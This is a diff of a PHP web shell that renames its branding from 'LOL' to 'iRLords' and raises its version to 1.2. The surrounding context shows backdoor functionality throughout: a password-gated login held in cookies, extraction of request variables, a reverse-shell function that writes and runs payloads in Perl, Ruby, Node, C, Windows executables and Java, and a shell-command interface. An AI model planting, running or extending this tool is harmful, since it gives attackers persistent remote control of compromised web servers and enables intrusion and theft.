@@ -1,8 +1,8 @@
 <?php
 $s_pass = "429b962dc480eebed7b0a1f0170da1312276db37";
 
-$s_ver = "1.0";
-$s_title = "IrLoars V ".$s_ver;
+$s_ver = "1.2";
+$s_title = "iRLords V ".$s_ver;
 $s_login_time = 3600 * 24 * 7;
 $s_debug = false;
 
@@ -36,19 +36,19 @@ else{
 $s_auth = true;
 @extract($_REQUEST["f"]);
 if(strlen(trim($s_pass))>0){
-    if(isset($_COOKIE['LOL'])){
-        if(strtolower(trim($s_pass)) == strtolower(trim($_COOKIE['LOL']))) $s_auth = true;
+    if(isset($_COOKIE['iRLords'])){
+        if(strtolower(trim($s_pass)) == strtolower(trim($_COOKIE['iRLords']))) $s_auth = true;
     }
     if(isset($_GP['login'])){
         $s_login = kript($_GP['login']);
         if(strtolower(trim($s_pass)) == $s_login){
-            setcookie("LOL",$s_login,time() + $s_login_time);
+            setcookie("iRLords",$s_login,time() + $s_login_time);
             $s_auth = true;
         }
     }
     if(isset($_GP['x']) && ($_GP['x']=='logout')){
         $persist = array("theme", "cwd");
-        $s_reload = (isset($_COOKIE['LOL_included']) && isset($_COOKIE['s_home']))? rtrim(urldecode($_COOKIE['s_self']),"&"):"";
+        $s_reload = (isset($_COOKIE['iRLords_included']) && isset($_COOKIE['s_home']))? rtrim(urldecode($_COOKIE['s_self']),"&"):"";
         foreach($_COOKIE as $s_k=>$s_v){
             if(!in_array($s_k, $persist)) if(!is_array($s_k)) setcookie($s_k,"",time() - $s_login_time);
         }
@@ -220,7 +220,7 @@ function rs($s_rstype,$s_rstarget,$s_rscode){
         elseif($s_lang=="pl") $s_runlang = "perl";
         elseif($s_lang=="rb") $s_runlang = "ruby";
         elseif($s_lang=="js") $s_runlang = "node";
-        $s_fpath = "LOL_rs.".$s_lang;
+        $s_fpath = "iRLords_rs.".$s_lang;
         if(@is_file($s_fpath)) unlink($s_fpath);
         if($s_file = fopen($s_fpath, "w")){
             fwrite($s_file, $s_fc);
@@ -239,7 +239,7 @@ function rs($s_rstype,$s_rstarget,$s_rscode){
         else $s_result = $s_errperm;
     }
     elseif($s_lang=="c"){
-        $s_fpath = "LOL_rs";
+        $s_fpath = "iRLords_rs";
         if(@is_file($s_fpath)) unlink($s_fpath);
         if(@is_file($s_fpath.".c")) unlink($s_fpath.".c");
         if($s_file = fopen($s_fpath.".c", "w")){
@@ -258,7 +258,7 @@ function rs($s_rstype,$s_rstarget,$s_rscode){
         else $s_result = $s_errperm;
     }
     elseif($s_lang=="win"){
-        $s_fpath = "LOL_rs.exe";
+        $s_fpath = "iRLords_rs.exe";
         if(@is_file($s_fpath)) unlink($s_fpath);
         if($s_file = fopen($s_fpath,"w")){
             fwrite($s_file,$s_fc);
@@ -271,7 +271,7 @@ function rs($s_rstype,$s_rstarget,$s_rscode){
         else $s_result = $s_errperm;
     }
     elseif($s_lang=="java"){
-        $s_fpath = "LOL_rs";
+        $s_fpath = "iRLords_rs";
         if(@is_file($s_fpath.".java")) unlink($s_fpath.".java");
         if(@is_file($s_fpath.".class")) unlink($s_fpath.".class");
         if($s_file = fopen($s_fpath.".java", "w")){
@@ -874,11 +874,11 @@ $s_self = "?";
 $s_cek1 = basename($_SERVER['SCRIPT_FILENAME']);
 $s_cek2 = substr(basename(__FILE__),0,strlen($s_cek1));
 
-if(isset($_COOKIE['LOL_included'])){
+if(isset($_COOKIE['iRLords_included'])){
     if(strcmp($s_cek1,$s_cek2)!=0) $s_self = $_COOKIE['s_self'];
     else{
         $s_self = "?";
-        setcookie("LOL_included", "0" ,time() - $s_login_time);
+        setcookie("iRLords_included", "0" ,time() - $s_login_time);
         setcookie("s_self", $s_self ,time() + $s_login_time);
     }
 }
@@ -890,12 +890,12 @@ else{
         }
         if(isset($s_home)) $s_self = $s_home;
         elseif(isset($_COOKIE['s_home'])) $s_self = $_COOKIE['s_home'];
-        setcookie("LOL_included", "1" ,time() + $s_login_time);
+        setcookie("iRLords_included", "1" ,time() + $s_login_time);
         setcookie("s_self", $s_self ,time() + $s_login_time);
     }
     else{
         $s_self = "?";
-        setcookie("LOL_included", "0" ,time() - $s_login_time);
+        setcookie("iRLords_included", "0" ,time() - $s_login_time);
         setcookie("s_self", $s_self ,time() + $s_login_time);
     }
 }
@@ -949,7 +949,7 @@ if($s_auth){
     foreach($s_access as $s){
         if(isset($_COOKIE[$s])){ $$s = $_COOKIE[$s]; }
         else{
-            if(!isset($_COOKIE['LOL'])){
+            if(!isset($_COOKIE['iRLords'])){
                 $t = explode("_", $s);
                 $t = check_access($t[1]);
                 if($t!==false){
@@ -1248,7 +1248,7 @@ if($s_auth){
                     $s_script = $s_classname;
                 }
                 else{
-                    $s_rand = "LOL_".substr(md5(time().rand(0,100)),0,8);
+                    $s_rand = "iRLords_".substr(md5(time().rand(0,100)),0,8);
                     $s_script = $s_rand;
                     $s_code = "class ".$s_rand." { ".$s_code . " } ";
                 }
@@ -2303,10 +2303,10 @@ if(!empty($s_error)) $s_result = notif($s_error).$s_result;
 <table id='main'><tr><td>
 <?php if($s_auth){?>
     <div><span style='float:right;'><?php
-    if(!isset($_COOKIE['LOL_included'])){
+    if(!isset($_COOKIE['iRLords_included'])){
     ?><a href='?x=pass'>password</a> | 
     <?php }
-    ?><a href='<?php echo $s_self; ?>x=logout' title='Click me to log out'>log out</a>  <a href='<?php echo $s_self; ?>x=switch' title='Click me to change theme'><span class='schemabox'>&nbsp;&nbsp;</span></a></span><table id='header'><tr><td style='width:80px;'><table><tr><td><h1><a href='<?php echo $s_self."cd=".cp(dirname(realpath($_SERVER['SCRIPT_FILENAME']))); ?>'>LOL</a></h1></td></tr><tr><td style='text-align:right;'><div class='ver'><?php echo $s_ver; ?></div></td></tr></table></td>   <td><div class='headinfo'><?php echo $s_info; ?></div></td></tr></table></div>
+    ?><a href='<?php echo $s_self; ?>x=logout' title='Click me to log out'>log out</a>  <a href='<?php echo $s_self; ?>x=switch' title='Click me to change theme'><span class='schemabox'>&nbsp;&nbsp;</span></a></span><table id='header'><tr><td style='width:80px;'><table><tr><td><h1><a href='<?php echo $s_self."cd=".cp(dirname(realpath($_SERVER['SCRIPT_FILENAME']))); ?>'>iRLords</a></h1></td></tr><tr><td style='text-align:right;'><div class='ver'><?php echo $s_ver; ?></div></td></tr></table></td>   <td><div class='headinfo'><?php echo $s_info; ?></div></td></tr></table></div>
     <div style='clear:both;'></div>
     <form method='post' name='g'></form>
     <div id='menu'>
@@ -2339,12 +2339,12 @@ else echo "- shell command -";
     <div style='width:100%;text-align:center;'>
     <form action='<?php echo $s_self; ?>' method='post'>
     <img src='<?php echo $s_favicon; ?>' style='margin:2px;vertical-align:middle;' />
-    LOL&nbsp;<span class='gaya'><?php echo $s_ver; ?></span><input id='login' class='inputz' type='password' name='login' style='width:120px;' value='' />
+    iRLords&nbsp;<span class='gaya'><?php echo $s_ver; ?></span><input id='login' class='inputz' type='password' name='login' style='width:120px;' value='' />
     <input class='inputzbut' type='submit' value='Go !' name='submitlogin' style='width:80px;' />
     </form>
     </div>
 <?php }?>   </td></tr></table>
-<p class='footer'>:() &copy;<?php echo @date("Y",time())." "; ?>LOL</p>
+<p class='footer'>:() &copy;<?php echo @date("Y",time())." "; ?>iRLords</p>
 <?php echo $main_scs;?>
 <script type='text/javascript'>
 var d = document;
